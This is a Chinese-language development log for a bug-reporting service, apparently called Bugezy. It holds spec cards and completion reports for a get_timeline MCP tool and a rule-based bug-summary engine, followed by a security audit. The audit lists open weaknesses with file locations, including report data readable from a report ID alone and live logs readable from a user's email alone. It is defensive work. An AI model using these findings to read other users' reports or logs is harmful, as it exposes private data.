  'get_timeline',
  '取得一份報告的完整時間軸（時序麵包屑）。把 Console、Network、語音、DOM、網路環境、儲存狀態全部按時間排序成一條故事線。AI 只需呼叫這一個 tool 就能掌握完整 Bug 脈絡。',
  {
    report_id: z.string().describe('報告 ID'),
  },
  async (args) => {
    const { report_id } = args;

    // 1. 讀取報告所有資料
    const { data: report, error } = await supa(env)
      .from('reports')
      .select('*')
      .eq('report_id', report_id)
      .maybeSingle();

    if (error || !report) {
      console.error('get_timeline failed:', error?.message);
      return txt('報告不存在或查詢失敗');
    }

    // 2. 收集所有事件到統一陣列
    const events: Array<{ time: number; type: string; icon: string; text: string }> = [];

    // Console logs
    const consoleLogs = report.console_logs || [];
    consoleLogs.forEach((log: any) => {
      const icon = log.level === 'error' ? '❌' : log.level === 'warn' ? '⚠️' : 'ℹ️';
      events.push({
        time: log.timestamp || 0,
        type: 'console',
        icon,
        text: `[Console ${log.level}] ${log.message}`,
      });
    });

    // Network errors
    const networkErrors = report.network_errors || [];
    networkErrors.forEach((net: any) => {
      events.push({
        time: net.timestamp || 0,
        type: 'network',
        icon: '🌐',
        text: `[Network] ${net.method} ${net.url} → ${net.status} (${net.duration || '?'}ms)`,
      });
    });

    // Voice transcript
    const voiceTranscript = report.voice_transcript || [];
    voiceTranscript.forEach((v: any) => {
      events.push({
        time: v.timestamp || 0,
        type: 'voice',
        icon: '🎙️',
        text: `[語音] ${v.text}`,
      });
    });

    // Markers (使用者標記的重要時間點)
    const markers = report.markers || [];
    markers.forEach((m: any) => {
      events.push({
        time: m.timestamp || 0,
        type: 'marker',
        icon: '📌',
        text: `[標記] ${m.label || 'user marker'}`,
      });
    });

    // 3. 按時間排序
    events.sort((a, b) => a.time - b.time);

    // 4. 計算相對時間（從第一個事件起算）
    const startTime = events.length > 0 ? events[0].time : 0;

    // 5. 組裝時間軸文字
    let timeline = `📋 報告時間軸 — ${report.title || report.url}\n`;
    timeline += `頁面：${report.url}\n`;
    timeline += `瀏覽器：${report.user_agent || 'unknown'}\n`;
    timeline += `螢幕：${report.screen_size || 'unknown'}\n`;

    // 網路環境
    if (report.network_snapshot) {
      const ns = report.network_snapshot;
      const atStart = ns.atStart || ns;
      timeline += `網路：${atStart.online ? '在線' : '離線'} / ${atStart.effectiveType || '?'} / RTT ${atStart.rtt ?? '?'}ms / ${atStart.downlink ?? '?'} Mbps\n`;
    }

    // 儲存快照摘要
    if (report.storage_snapshot) {
      const ss = report.storage_snapshot;
      const lsCount = ss.localStorage?.length || 0;
      const ssCount = ss.sessionStorage?.length || 0;
      timeline += `儲存：localStorage ${lsCount} 項 / sessionStorage ${ssCount} 項 / Cookie ${ss.cookieCount || 0} 個\n`;
    }

    timeline += `描述：${report.description || '（無）'}\n`;
    timeline += `─────────────────────────\n`;

    if (events.length === 0) {
      timeline += '（無事件記錄）\n';
    } else {
      events.forEach(e => {
        const relSec = ((e.time - startTime) / 1000).toFixed(1);
        timeline += `[${relSec}s] ${e.icon} ${e.text}\n`;
      });
    }

    timeline += `─────────────────────────\n`;
    timeline += `共 ${events.length} 個事件（Console ${consoleLogs.length} / Network ${networkErrors.length} / 語音 ${voiceTranscript.length} / 標記 ${markers.length}）`;

    return txtWithTokens([timeline], 'get_timeline');
  },
);
```

---

#### §2 Token 估算表加 get_timeline

```ts
const TOOL_TOKEN_ESTIMATES: Record<string, number> = {
  // ...現有
  get_timeline: 20, // 時間軸摘要
};
```

---

#### §3 首頁 / /features 的 MCP 工具數量更新

MCP 工具從 12 個 → 13 個（加了 get_timeline）。搜尋首頁和 /features 頁的「12 個 MCP 工具」改成「13」。

---

#### §4 不改的東西

- 現有 12 個 MCP tools：不動（get_timeline 是新增的第 13 個）
- extension / popup：不動
- 認證 / ECPay：不動
- 報告上傳 / 儲存：不動

#### Deploy

```
cd server && npx wrangler deploy
```

#### 驗收

1. MCP 呼叫 `get_timeline(report_id: "你最新的報告 ID")` → 回傳完整時間軸
2. 時間軸包含 console + network + 語音 + 網路環境 + 儲存摘要
3. 事件按相對時間排序 `[0.0s] [0.5s] [1.2s]`
4. Token 估算 footer 有 get_timeline
5. 首頁 / features 顯示「13 個 MCP 工具」

---

### ✅ DONE-158 — Claude Code 回報（2026-07-05）

**完成內容**（新增第 13 個 MCP tool `get_timeline`）：

1. **§1 get_timeline tool**：以實際 MCP API 實作（`server.tool(name, desc, {report_id:z.string()}, handler)`、`supabase()`、`txt`/`txtWithTokens`）。讀報告 `select('*')`→收集 console/network/voice/marker 到統一陣列→按時間排序→輸出人類可讀時間軸。表頭含 頁面/瀏覽器/螢幕 + **網路環境摘要**（在線·類型·RTT·頻寬，atEnd 異動另標）+ **儲存摘要**（localStorage/sessionStorage 項數·Cookie 數·「敏感值已遮罩」）+ 描述；事件用 `[相對秒]s 圖示 文字`；表尾統計各類筆數。
2. **§重點③ 相對時間**：`startTime` = console/network/voice 中**最早的正時間戳**（Date.now() ms），各事件 `relSec=((time-startTime)/1000).toFixed(1)` → `[0.0s] [0.5s] [1.5s]…`。
3. **§2 Token 估算**：`txtWithTokens` 自動附 footer（response 長度估 token）；`chromeMultiplier` 加 `get_timeline: 25`（一次拿完整時序 ≈ Chrome 讀整頁 DOM + DevTools + 人工對時間軸）。
4. **§3 工具數量 12→13**：更新 **/install** 頁「13 個 MCP 工具」中英文案 + 在工具清單加 `get_timeline`（完整時序麵包屑 / full timeline）。

**修正規格與實作不符處（動手前先驗型別，memory 有記）**：
- **標記欄位**：規格範例用 `m.timestamp` / `m.label`，但實際 `TimeMarker` 是 **`time_sec`（相對錄製起點的秒數）+ `note`**——非絕對時間戳。改為 `絕對時間 = startTime + time_sec*1000` 換算後再排序，讓標記正確插入時間軸（實測 `time_sec:2.5` 精準落在 2.5s，與同刻的 network error 並列）。
- **瀏覽器欄位**：規格用 `report.user_agent`，實際欄位是 **`browser`**。已改。
- **Token 表**：規格 §2 的 `TOOL_TOKEN_ESTIMATES` 常數表不存在；實際 token 估算是「response 長度 / 3.5 + `chromeMultiplier` 倍率」。改在 `chromeMultiplier` 註冊 `get_timeline`。
- **工具數量位置**：實際「12 個 MCP 工具」清單在 **/install** 頁（首頁/features 無數字計數，只有「支援所有 MCP 工具」文字）。已更新 /install。

**驗收（線上 MCP 實測，非只 build）**：
- `npx wrangler deploy` ✅（Version `0a6b9318`）；`tsc --noEmit` ✅。
- 建測試報告（語音 ts0.5s前 / warn / error / network500 / marker time_sec2.5 / 網路4g / storage）→ `/mcp` JSON-RPC handshake(initialize→initialized→tools/call) 呼叫 `get_timeline` → 回傳正確排序時間軸：
  `[0.0s]🎙️語音 → [0.5s]⚠️warn → [1.5s]❌error<window.onerror> → [2.5s]🌐Network POST /api/checkout→500(320ms) → [2.5s]📌標記`，含網路/儲存摘要 + Token footer（~143 tok，vs Chrome 3,575，省 96%）。
- /install 中英雙語皆顯示「13 個 MCP 工具」+ get_timeline（`?lang=zh`/`?lang=en` 各驗）。

**里程碑**：MCP 13 tool。PM-153~157 累積的 console/JS/Promise/資源/效能/網路/儲存七維資料，PM-158 用 `get_timeline` 合成一條故事線——AI 呼叫**一個** tool 即掌握完整 Bug 脈絡，省去逐一呼叫 5+ tool 的 token。

**DONE-158**

---

### 🟡 PM-159：MCP 報告摘要 — AI 導航提示（Context Pinpointing）

**背景**：PM-158 的 get_timeline 給了完整時間軸，但 AI 還是需要自己分析因果。如果在時間軸最前面加一段**自動生成的 Bug 摘要**，AI 就能直接定位問題，不用盲讀。

**目標**：在 `get_timeline` 的輸出最前面，用 server 端邏輯自動分析並附上 Bug 摘要導航。

**不用 Workers AI**——用規則引擎分析（不花額外 API 費用，零成本）。

---

#### §1 Server：建立 Bug 分析引擎

```ts
function generateBugSummary(report: any): string {
  const consoleLogs = report.console_logs || [];
  const networkErrors = report.network_errors || [];
  const voiceTranscript = report.voice_transcript || [];
  const networkSnapshot = report.network_snapshot || {};
  const storageSnapshot = report.storage_snapshot || {};

  const errors = consoleLogs.filter((l: any) => l.level === 'error');
  const warnings = consoleLogs.filter((l: any) => l.level === 'warn');
  const rejections = consoleLogs.filter((l: any) => l.source === 'unhandledrejection');
  const resourceErrors = consoleLogs.filter((l: any) => l.source === 'resource-error');
  const webVitals = consoleLogs.filter((l: any) => l.source === 'web-vitals');
  const netFails = networkErrors.filter((n: any) => n.status >= 400);

  const lines: string[] = [];
  lines.push('🔍 AI Bug 導航摘要');
  lines.push('');

  // 根因判斷
  if (rejections.length > 0) {
    lines.push(`⚡ 根因線索：發現 ${rejections.length} 個未捕捉的 Promise Rejection（async/await 可能缺少 catch）`);
    lines.push(`   → ${rejections[0].message.slice(0, 150)}`);
  }
  
  if (netFails.length > 0) {
    const corsErrors = warnings.filter((w: any) => /CORS|Access-Control/i.test(w.message));
    if (corsErrors.length > 0) {
      lines.push(`⚡ 根因線索：CORS 跨域錯誤 — API 請求被瀏覽器擋掉`);
      lines.push(`   → 建議檢查 server 的 Access-Control-Allow-Origin header`);
    } else {
      const first = netFails[0];
      lines.push(`⚡ 根因線索：API 呼叫失敗 ${first.method} ${first.url} → ${first.status}`);
      if (first.status === 404) lines.push('   → 端點不存在，檢查 URL 拼寫或 server 路由');
      if (first.status === 500) lines.push('   → Server 內部錯誤，檢查 server logs');
      if (first.status === 401 || first.status === 403) lines.push('   → 認證/權限問題，檢查 token 或登入狀態');
    }
  }

  if (resourceErrors.length > 0) {
    lines.push(`⚡ 根因線索：${resourceErrors.length} 個資源載入失敗（頁面可能破版）`);
    lines.push(`   → ${resourceErrors[0].message.slice(0, 150)}`);
  }

  if (errors.length > 0 && rejections.length === 0 && netFails.length === 0) {
    lines.push(`⚡ 根因線索：JavaScript 執行錯誤`);
    lines.push(`   → ${errors[0].message.slice(0, 150)}`);
  }

  // 環境資訊
  const atStart = networkSnapshot.atStart || networkSnapshot;
  if (atStart.online === false) {
    lines.push('🌐 注意：使用者處於離線狀態');
  } else if (atStart.effectiveType === 'slow-2g' || atStart.effectiveType === '2g') {
    lines.push(`🌐 注意：使用者網路極慢（${atStart.effectiveType}，RTT ${atStart.rtt}ms）`);
  }

  // 儲存線索
  const ls = storageSnapshot.localStorage || [];
  const tokenItem = ls.find((i: any) => /token|auth|session/i.test(i.key));
  if (tokenItem && tokenItem.value === '***MASKED***') {
    // token 存在（被遮罩了，正常）
  } else if (tokenItem && (tokenItem.value === 'null' || tokenItem.value === '')) {
    lines.push('💾 注意：localStorage 的 token/auth 為空 — 可能是登入狀態丟失');
  }

  // 語音描述
  if (voiceTranscript.length > 0) {
    const firstVoice = voiceTranscript[0].text || '';
    if (firstVoice) {
      lines.push(`🎙️ 使用者描述：「${firstVoice.slice(0, 100)}」`);
    }
  }

  // Web Vitals 警告
  const badVitals = webVitals.filter((v: any) => v.level === 'warn');
  if (badVitals.length > 0) {
    lines.push(`⚡ 效能問題：${badVitals.map((v: any) => v.message.replace('Web Vital ', '')).join(' / ')}`);
  }

  // 統計
  lines.push('');
  lines.push(`📊 統計：${errors.length} error / ${warnings.length} warn / ${netFails.length} network fail / ${resourceErrors.length} resource fail`);

  if (lines.length <= 3) {
    lines.push('✅ 未偵測到明顯異常，建議查看完整時間軸');
  }

  return lines.join('\n');
}
```

---

#### §2 get_timeline 整合 Bug 摘要

在 PM-158 的 `get_timeline` 輸出最前面加上摘要：

```ts
// 在 timeline 字串組裝之前
const summary = generateBugSummary(report);

let timeline = summary + '\n\n';
timeline += `📋 報告時間軸 — ${report.title || report.url}\n`;
// ...後續現有的時間軸內容
```

這樣 AI 呼叫 `get_timeline` 一次就拿到：**摘要導航 + 完整時間軸**。

---

#### §3 也加到 get_report_overview

`get_report_overview` 的回傳也加上 `generateBugSummary`，讓 AI 在看概覽時就能快速定位。

---

#### §4 不改的東西

- 其他 MCP tools：不動
- extension / popup：不動
- 報告上傳 / 儲存：不動
- Workers AI（不用呼叫，純規則引擎）

#### Deploy

```
cd server && npx wrangler deploy
```

#### 驗收

1. MCP `get_timeline` → 最前面有「🔍 AI Bug 導航摘要」
2. 有 unhandledrejection → 摘要提到「Promise Rejection」
3. 有 CORS 錯誤 → 摘要提到「CORS 跨域」+ 建議檢查 header
4. 有 network 500 → 摘要提到「Server 內部錯誤」
5. 離線狀態 → 摘要提到「使用者處於離線」
6. 有語音 → 摘要引用使用者描述
7. 無異常 → 顯示「未偵測到明顯異常」

---

### ✅ DONE-159 — Claude Code 回報（2026-07-05）

**完成內容**（零成本規則引擎，不呼叫 Workers AI）：

1. **§1 generateBugSummary(report)**：新增頂層規則引擎，分析 console/network/voice/網路/儲存，產生「🔍 AI Bug 導航摘要」。判斷邏輯：
   - **Promise Rejection**（`source==='unhandledrejection'`）→「未捕捉的 Promise Rejection，async/await 可能缺 catch」+ 首則訊息。
   - **Network fail**（status≥400）：先看 warn 有無 CORS/Access-Control → 有則「CORS 跨域錯誤，建議檢查 Access-Control-Allow-Origin」；否則「API 呼叫失敗 method url → status」+ 依碼給建議（404 端點不存在 / 500 Server 內部錯誤 / 401·403 認證權限）。
   - **資源載入失敗**（`source==='resource-error'`）→「N 個資源載入失敗，頁面可能破版」。
   - **純 JS 錯誤**（有 error 但無 rejection/netFail）→「JavaScript 執行錯誤」+ 首則。
   - **環境**：離線→「使用者處於離線狀態」；slow-2g/2g→「網路極慢」。
   - **儲存**：localStorage 中 token/auth/session 的值為空/`null`→「登入狀態丟失」（被遮罩的 `***MASKED***` 視為正常不報）。
   - **語音**：引用使用者第一句描述。
   - **Web Vitals**：warn 級的效能問題列出。
   - **無任何線索** → 「✅ 未偵測到明顯異常」。結尾附統計（error/warn/network fail/resource fail 數）。
2. **§2 get_timeline 整合**：輸出最前面 `generateBugSummary(report) + '\n\n'` 再接時間軸——AI 一次呼叫拿到「摘要導航 + 完整時間軸」。
3. **§3 get_report_overview 整合**：改 `select('*')`（供引擎分析原始 logs），回傳仍只給 metadata + 新增 `ai_bug_summary`（**不含原始陣列，維持 overview 省 token 定位**）。

**修正規格 Bug（§1 判斷位置）**：規格原 `if (lines.length <= 3)` 放在 stats push **之後**——但 stats 前會先 `push('')` 再 push 統計行，lines 恆 ≥4，導致「未偵測到明顯異常」**永遠不會顯示**（違反驗收 #7）。改為在 stats **之前**判斷 `if (lines.length <= 2)`（僅剩標題兩行=無任何線索）才補該行。另補 `message` 可能 undefined 的防護（`clip()` / `|| ''`）。

**驗收（線上 MCP 實測，非只 build）**：`npx wrangler deploy` ✅（Version `b38d6757`）；`tsc` ✅。建 5 種情境報告經 `/mcp` JSON-RPC 實呼叫：
| 情境 | 摘要輸出 | ✓ |
|---|---|---|
| unhandledrejection | 「發現 1 個未捕捉的 Promise Rejection」+ 訊息 | ✅ |
| network 500 | 「API 呼叫失敗 POST /api/checkout → 500」「Server 內部錯誤」 | ✅ |
| CORS（warn 含 Access-Control + 403）| 「CORS 跨域錯誤」+ 建議檢查 header | ✅ |
| 離線 + token 空 | 「使用者處於離線狀態」+「登入狀態丟失」 | ✅ |
| 空報告 | 「✅ 未偵測到明顯異常」（bug 修正生效）| ✅ |
| 有語音 | 「🎙️ 使用者描述：「…」」 | ✅ |

`get_report_overview` 實測回傳含 `ai_bug_summary`（500→Server error + 語音）且**不含 console_logs 等原始陣列**（維持省 token）。

**里程碑**：AI 導航提示（Context Pinpointing）。PM-158 的 get_timeline + PM-159 的規則引擎摘要 = AI 呼叫一次即「先看結論、再看時間軸」，零 API 成本自動定位根因。

**DONE-159**

---

### 🔍 Fable 5 第三輪安全稽核 — 第一階段：安全修復驗證

> 日期：2026-07-05
> 稽核模型：Fable 5
> 範圍：PM-128~146 安全修復驗證（獨立讀 code 驗證，未改任何程式碼）
> 讀取檔案：server/src/index.ts（4286 行全讀）、extension/src/{background,popup,auth}.ts、manifest.json、wrangler.toml、edit-report.ts（AI 端點呼叫段）、annotate.ts（呼叫段）、dist-zip btoa 全域搜尋

#### 修復驗證結果

| PM | 問題 | 修復狀態 | 我的評估 | 備註 |
|---|---|---|---|---|
| 128 | session token 認證取代假 base64 | ✅ 已修好 | `verifySession`（index.ts:145-165）確實查 `sessions` 表比對 `session_token`，過期（`expires_at <= now`）自動刪除回 null。token 長度 <10 直接拒。無猜測繞過空間（雙 UUID = 72 字元隨機）。 | 唯一取 user_id 的入口 `getAuthUserId`（:168）只呼叫 `verifySession`，無任何 fallback 分支。 |
| 129 | extension 改用 session token | ✅ 已修好 | `auth.ts` 只讀 `SESSION_TOKEN_KEY`（DB token），無 `btoa`/base64 產生。全 extension/src `btoa` 搜尋：**0 筆**。dist-zip 內 4 筆 `btoa` 是 rrweb UTF-8 轉碼工具（`unescape(encodeURIComponent(str))`），與 auth token 無關。 | 舊 token 失效者走 `refreshSessionSilently`（popup.ts:632）靜默續期。 |
| 130 | CORS 收緊 + FAQ 刪競品 + 錯誤脫敏 | ✅ 已修好 | CORS 白名單（:83-101）只放行 `bugezy.dev` + `bugezy-api...workers.dev` + `chrome-extension://*`，其餘回退 `bugezy.dev`（等同拒絕）。錯誤脫敏：`GENERIC_500` 統一對外，原始錯誤只進 `console.error`（全檔 12 處 `error.message` 皆在 console.error 內，**無一外洩到 response body**）。FAQ 英文版 `Jam` 搜尋：**0 筆**（server/src 全域也 0 筆）。 | 見下方新問題 #3：CORS 用 `Vary: Origin` 但 GET 報告端點無 no-store，理論上仍可被邊緣快取（PM-132 只保護了 list/plan）。 |
| 131 | POST body 大小限制 | ✅ 已修好 | 全域 POST 10MB（:2369-2372，排除 transcribe）；單報告 5MB（`createReport` :2588-2591）；transcribe 音訊 25MB（`handleTranscribe` :2899）。三層皆先看 Content-Length 擋，transcribe 另加 blob.size 二次驗證。 | Content-Length 可偽造，但 25MB blob.size 二次檢查補上；R2 灌爆風險已收斂。 |
| 132 | GET /api/reports 加認證 + user 過濾 | ✅ 已修好 | `listReports`（:2752）先 `getAuthUserId`，未登入回 401；查詢 `.eq('user_id', userId)` 只回自己的。回應走 `jsonNoStore`（含 401 也是）。匿名**無法**列舉，也看不到別人的。 | ✅ no-store 到位。 |
| 133 | 認證信任鏈重構（Google token 驗 aud） | ✅ 已修好 | **重點驗證**：`verifyGoogleToken`（:174-204）先打 tokeninfo 取 `aud`（fallback `azp`），比對 `env.GOOGLE_CLIENT_ID`，**不符即拒**（含 `GOOGLE_CLIENT_ID` 未設也拒）。`createSession`（:208）的 `user_id` 一律由 `verified.sub` 推導，**完全不讀** body 的 user_id。舊 `/api/auth/google`（假 base64）已刪除（:2948 註解 + 路由表無此端點）。base64 fallback 全鏈 0 殘留。 | GOOGLE_CLIENT_ID 在 wrangler.toml [vars]（:10），與 manifest oauth2 client_id 一致 ✅。見新問題 #4：aud 驗證正確，但 tokeninfo 未驗 `exp`/`expires_in`（Google tokeninfo 端點回 200 即代表未過期，此點可接受，僅記錄）。 |
| 134 | getUserPlan no-store 防快取 | ✅ 已修好 | `getUserPlan`（:2953）全部回應路徑（401/404/500/正常）皆走 `jsonNoStore`，`Cache-Control: no-store` 由 `jsonNoStore`（:120-124）注入。 | ✅ 正確。 |
| 135 | AI 端點加認證 + 付費檢查 | ✅ 已修好 | `summarize`（:2784）、`correct`（:2818）、`transcribe`（:2867）三者開頭皆 `getAuthUserId`，未登入 401。**transcribe 額外做付費檢查**（:2872-2880 `isActiveUser` → 免費版 403「Whisper 語音為付費功能」）。匿名打三者皆 401；免費版打 transcribe 403。 | summarize/correct 只需登入不需付費（合理，Workers AI 成本低）；transcribe 付費限定正確。 |
| 142 | MCP list_reports 加 session_token 驗證 | ✅ 已修好（但 optional 有殘留風險，見備註） | `list_reports`（:3772）帶 `session_token` 時嚴格比對 sessions 表 user_id（:3812-3821）。MCP 錯誤訊息全部脫敏（`查詢失敗，請稍後再試`），原始 error 只進 console.error（:3805,3833）。 | ⚠ `session_token` 為 **optional**——不帶時只靠 `user_email` 就能列該 email 的報告（:3789-3808）。這是「知道 email 即可列報告」的殘留（PM-142 註解自承為向下相容取捨）。**列為新問題 #1（升級為報告全鏈無擁有權驗證的一環）**。 |
| 143 | live-errors/terminal-logs 改 per-user R2 key | ✅ 已修好 | R2 key 改 `live-errors/${userId}/latest.json`、`terminal-logs/${userId}/latest.json`（:2029,2049），非全域共用。POST/GET 兩端皆先 `getAuthUserId`（:2444-2486），未登入 401。MCP 端 `get_live_errors`/`get_terminal_logs` 走 `lookupUserId(email)`（:3986）。 | 見新問題 #2：MCP 端 `get_live_errors`/`get_terminal_logs` 只憑 `user_email` 查（無 session_token 驗證）→ 知道某人 email 即可讀他的即時 console/stderr（含密鑰）。這比 HTTP 端弱。 |
| 144 | terminal-logs 付費限定 | ✅ 已修好 | HTTP POST/GET `/api/terminal-logs` 皆 `isActiveUserId` 檢查（:2471,2483），免費版 403。 | ⚠ MCP `get_terminal_logs`（:4020）**無付費檢查**——免費用戶（或知道付費用戶 email 者）可經 MCP 讀 terminal logs。HTTP 端擋了、MCP 端沒擋。列為新問題 #2 的一部分。 |
| 145 | ECPay callback 冪等 + payments 表 | ✅ 已修好（邏輯正確，但有非原子性與 SimulatePaid 繞過的殘餘風險） | **重點驗證**：`paymentAlreadyPaid`（:3132）查 payments 表 status==='paid'；月費 callback（:3179）、日票 callback（:3328）、定期定額（:3409）三處皆先查冪等再處理。**金額比對到位**：月費 `!== 80`（:3184）、日票 `!== 20`（:3333）、定期 `> 0 && !== 80`（:3415）不符則不授權。定期定額冪等 key 用 `MerchantTradeNo-Gwsr` 組合（:3406）避免把續期誤判為重送。CheckMacValue 用 `timingSafeEqualStr` 常數時間比對（:3168）。 | 見新問題 #5（非阻斷性）：`recordPayment` upsert 失敗只 log 不阻斷（:3156），若 payments 表寫入失敗，冪等保護失效→下次同 tradeNo 重送會**再次展延到期日**。且 `SimulatePaid=1`（:3173）在冪等檢查**之前**回 1|OK——正式環境若攻擊者能偽造合法 CheckMacValue（需 HASH_KEY，難）可用 SimulatePaid 繞過，但因需正確簽章，風險低。 |
| 146 | 登出撤銷 session + PATCH 加 owner 驗證 | ✅ 已修好 | 登出：`handleLogout`（:251）從 sessions 表刪 token，舊 token 立即失效（下次 verifySession 查無回 null）。popup 登出（:832）先呼叫 server logout 再清本地。PATCH `updateReportSettings`（:2717）先 `getAuthUserId`（401）再查報告 owner 比對（:2731 `report.user_id !== userId` → 403）。別人**無法**改你的報告設定。 | ⚠ 路由表註解（:2550）仍寫「有 share link 就能改，不需登入」——**與實際程式碼矛盾**（實際已需登入+owner）。僅註解過時，非安全問題，但易誤導。列為新問題 #6（文件性）。 |

#### 此階段發現的新問題

| # | 等級 | 問題 | 位置（檔案:行號） | 風險描述 | 建議修法 |
|---|---|---|---|---|---|
| 1 | 🔴 P0 | 報告讀取端點全鏈無擁有權驗證（GET /api/reports/:id + 全部 report_id-based MCP tools） | `getReport` index.ts:2670；`get_report_overview` :3841；`get_console_logs` :3874；`get_network_errors` :3890；`get_voice_transcript` :3906；`get_page_info` :3922；`get_rrweb_summary` :3937；`get_rrweb_events` :3967；`get_screenshots` :4068；`get_timeline` :4174 | **只憑 report_id（UUID）即可讀完整報告**：console/network/**語音全文**/DOM 軌跡/**storageSnapshot（含遮罩後仍可見的 key 名稱、cookie 名稱、localStorage 結構）**/截圖。report_id 雖是 UUID（不可猜），但只要外洩一次（貼到 issue、Slack、AI 對話、瀏覽器歷史、Referer）即任何人可讀，且**無法撤銷**。這是「share link = 公開」的設計，但 FAQ/隱私政策對外宣稱「報告預設私人，只有主動分享才可見」（index.ts:1141「只有你自己」/:832「僅在您主動分享連結時」）——**實作與承諾不符**：分享是隱含的（拿到 id 就能看），非明確授權。PM-142 把 list_reports 收緊了，但單筆讀取（威脅更大，含語音+storage）反而無防護。 | 兩選一：(a) 若定位就是「知道連結即可看」（類似 Google Docs 匿名連結），則**修正 FAQ/隱私政策措辭**，明說「持有連結者皆可檢視」；(b) 若要真正私有，`getReport` + 所有 report_id MCP tool 加 owner 驗證（比照 PATCH PM-146），或在報告加 `is_public` 欄位 + 分享 token 機制。**至少**：storageSnapshot / voice_transcript 這類高敏感欄位應要求擁有權。建議另開 PM 卡（P0）。 |
| 2 | 🟠 P1 | MCP live-errors / terminal-logs 僅憑 user_email 讀取（無 session_token 驗證 + terminal 無付費檢查） | `get_live_errors` index.ts:4001-4017；`get_terminal_logs` :4020-4036；`lookupUserId` :3986 | HTTP 端（PM-143/144）已加 `getAuthUserId` + 付費檢查，但 **MCP 對應 tool 只用 `user_email` 查 user_id**，無 session_token 比對。知道某人 email（email 極易取得）即可經 `/mcp` 讀他**當前頁面即時 console/network 錯誤**與**終端機 stderr/throw/crash**（後者常含連線字串、密鑰、堆疊路徑）。且 `get_terminal_logs` 無付費檢查（HTTP 端有）。這是 PM-142 對 list_reports 補洞、卻遺漏 live/terminal 兩個 MCP tool 的一致性缺口。 | 比照 list_reports 給 `get_live_errors`/`get_terminal_logs` 加 optional→**建議改必填** `session_token` 並嚴格驗證；`get_terminal_logs` 補 `isActiveUserId` 付費檢查。因 MCP 客戶端可在 config 帶固定參數，session_token 必填可行。 |
| 3 | 🟡 P2 | GET /api/reports/:id 無 no-store，報告內容可能被 Cloudflare 邊緣快取 | `getReport` 回傳走 `json()`（index.ts:2695），非 `jsonNoStore` | PM-132/134 已幫 list/plan 加 no-store 防跨用戶快取，但單筆報告讀取沒有。報告 URL 以 report_id 為鍵，理論上不會 A/B 混淆（不同 id 不同 URL），風險低於 list；但報告一旦被快取，即使日後刪除，邊緣仍可能回舊內容一段時間（與問題 #1 的「無法撤銷」疊加）。 | `getReport` 改用 `jsonNoStore`（或至少 `Cache-Control: private, no-cache`）。低成本。 |
| 4 | 🟢 P3（記錄用，可接受） | verifyGoogleToken 未顯式驗 token 過期 | index.ts:180-189 | 只比對 aud，未讀 `expires_in`/`exp`。實務上 Google tokeninfo 端點對過期 token 回非 200（`!tokenInfoRes.ok` 已擋），故過期 token 自然被拒，**目前安全**。僅記錄：若日後改用本地 JWT 解析而非打 tokeninfo，須自行驗 exp。 | 無須立即處理；若改架構再補。 |
| 5 | 🟡 P2 | ECPay 授權與 payments 記錄非原子，冪等保護依賴 payments 寫入成功 | `ecpayCallback` :3192-3212；`recordPayment` :3155-3156 | 流程是「先 update users 升級 → 再 upsert payments」，且 `recordPayment` 失敗只 log 不拋錯。若 users 升級成功但 payments 寫入失敗（表未建/暫時錯誤），下次同 `MerchantTradeNo` 重送時 `paymentAlreadyPaid` 回 false → **再次執行 `oneMonthLaterISO()` 展延到期日**（重複延展，非重複收費，但帳務失準）。金額比對正確、無重複扣款風險，故列 P2 而非 P0。 | 調整順序：先 upsert payments（status 先寫 pending/paid）成功後再升級 users；或 payments upsert 失敗時**拋錯回非 1|OK**讓綠界重送（確保帳務落地）。至少監控 `recordPayment failed` log。 |
| 6 | 🟢 P3（文件） | 路由表註解與實作矛盾 | index.ts:2550「PM-82：報告設定（允許 AI 讀截圖）— 有 share link 就能改，不需登入」 | 實際 `updateReportSettings`（PM-146）已改為需登入 + owner 驗證，此註解過時，會誤導後續開發者以為該端點無需認證。非安全漏洞（程式碼本身正確）。 | 更新註解為「PM-146：需登入 + 報告 owner」。 |

#### 稽核總評（第一階段）

**PM-128~146 的 13 項修復，逐行驗證結果：全部到位（13/13 ✅）**。第二輪的三大致命問題（createSession 無授權簽發、全站報告列舉外洩、base64 後門）**確認根除**：
- createSession 現在強制驗 Google token audience，user_id 由 server 推導，零客戶端信任。
- list_reports / GET reports 加認證 + user 過濾 + no-store。
- base64 token 全鏈 0 殘留（server 端 verifySession-only，extension 端 SESSION_TOKEN_KEY-only）。

ECPay 冪等（PM-145）核心邏輯正確——冪等查重 + 三種金流各自金額比對 + 常數時間簽章比對，皆到位；殘餘的非原子性（#5）是強化項非破洞。

**但本輪讀 code 揪出一個新的 P0（#1）**：PM-142 收緊了 list_reports，卻遺漏「單筆報告讀取」——`GET /api/reports/:id` 與**全部 10 個 report_id-based MCP tool 完全無擁有權驗證**，任何持有 report_id 者可讀完整報告（含語音全文、DOM、storageSnapshot）。加上這與對外「報告預設私人」的承諾（FAQ/隱私政策）不一致，構成合規 + 隱私雙重風險。配套的 #2（MCP live/terminal 只憑 email）是同一類「HTTP 端補了、MCP 端漏了」的一致性缺口。

**建議下一階段（PM 開卡）優先序**：#1（P0，報告讀取擁有權 or 修正對外措辭）→ #2（P1，MCP live/terminal session_token + 付費檢查）→ #5 #3（P2）→ #4 #6（P3）。

> ⚠ 本報告僅讀 code 靜態驗證，未跑線上實測。#1/#2 的實際可利用性建議以真實 report_id + 他人 email 做一次 MCP JSON-RPC 實呼叫確認（第二階段）。

**Fable 5 第三輪 · 第一階段完成**

### 🔍 Fable 5 第三輪安全稽核 — 第二階段：新功能安全檢查

> 日期：2026-07-05
> 稽核模型：Fable 5
> 範圍：PM-147~159 新功能 + 高風險模式搜尋（獨立讀 code，未改任何程式碼）
> 讀取檔案：extension/src/{inject,content,annotate,i18n,storage,net}.ts；server index.ts 報告頁 render() 全段；高風險模式 8 組搜尋

#### 新功能安全檢查結果

| PM | 功能 | 安全評估 | 說明 |
|---|---|---|---|
| 147 | 截圖標注走 Whisper | ✅ 安全 | annotate.ts 前端只憑 `plan/MIC_MODE_KEY` 決定 UI 走 Whisper（`useWhisper`, annotate.ts:513-518），**但實際打 `/api/transcribe` 仍走 server 端付費檢查**（PM-135，index.ts:2872-2880 `isActiveUser` → 免費 403）。前端旗標只影響 UI 引導，**無法繞過付費**——非付費者即使改 storage 偽造 plan、強制走 Whisper，server 仍 403（annotate.ts:482 有對應 403 UI 提示）。付費檢查的信任邊界在 server，前端不可信但也不被信任。✅ |
